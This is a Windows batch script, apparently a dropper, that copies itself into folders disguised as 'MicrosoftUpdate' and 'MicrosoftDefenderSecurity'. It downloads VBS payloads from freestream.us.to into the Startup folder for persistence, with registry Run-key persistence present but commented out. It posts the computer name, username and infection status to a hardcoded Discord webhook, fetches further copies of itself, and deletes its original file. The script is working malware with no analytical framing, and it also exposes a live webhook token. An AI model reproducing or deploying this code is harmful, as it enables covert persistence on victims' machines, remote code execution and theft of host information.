@echo off
cls

if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
set userfile=YES
)
if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftUpdate/"
copy /y %~f0 "%AppData%\MicrosoftUpdate\"
set userfile=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
set pcfile=YES
)
if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
set pcfile=YES, NEW CREATED
)


if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set userauto=YES
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
set userauto=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set pcauto=YES
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
::check for admin rights, commented out
::NET SESSION >nul 2>&1
::IF %ERRORLEVEL% EQU 0 (
::copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
::curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs" --output "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
::set pcauto=YES, NEW CREATED
::) ELSE (
::set pcauto=NO, NOT CREATED
::)
set pcauto=NO, NOT CREATED
)



if exist "%APPDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
set userregistryfile=YES
)
if not exist "%APPDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftDefenderSecurity/"
copy /y %~f0 "%AppData%\MicrosoftDefenderSecurity\"
set userregistryfile=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
set pcregistryfile=YES
)
if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftDefenderSecurity/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
set pcregistryfile=YES, NEW CREATED
)


if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
::reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
::set userregistryauto=YES
set userregistryauto=NO
)
if not exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
copy /y "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%APPDATA%\MicrosoftDefenderSecurity\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
::reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
::set userregistryauto=YES, NEW CREATED
set userregistryauto=NO
)


if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
::set pcregistryauto=YES
set pcregistryauto=NO
)
if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
::check for admin rights, commented out
::NET SESSION >nul 2>&1
::IF %ERRORLEVEL% EQU 0 (
copy /y "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v MicrosoftDefenderSecurity /d "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs -silent" /f
::set pcregistryauto=YES, NEW CREATED
::) ELSE (
::set pcregistryauto=NO, NOT CREATED
::)
set pcregistryauto=NO, NOT CREATED
)


for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%


set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\nTIME: %time%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\n  UserRegistry-Autostart: %userregistryauto%\n  UserRegistry-File: %userregistryfile%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1046074645612335154/cqFXfvKa33ETOYQEiyJWJP_RhPFciwxl7qcEcFzsbFYd4mh5Xqah3yfBg54a50Jh7MFH


curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"

curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat"

if %~dp0 NEQ %APPDATA%\MicrosoftUpdate\ (
if %~dp0 NEQ %PROGRAMDATA%\MicrosoftUpdate\ (
if %~dp0 NEQ %APPDATA%\MicrosoftDefenderSecurity\ (
if %~dp0 NEQ %PROGRAMDATA%\MicrosoftDefenderSecurity\ (
del /f /q %~f0
))))

if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.bat" (
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.bat"
)

exit
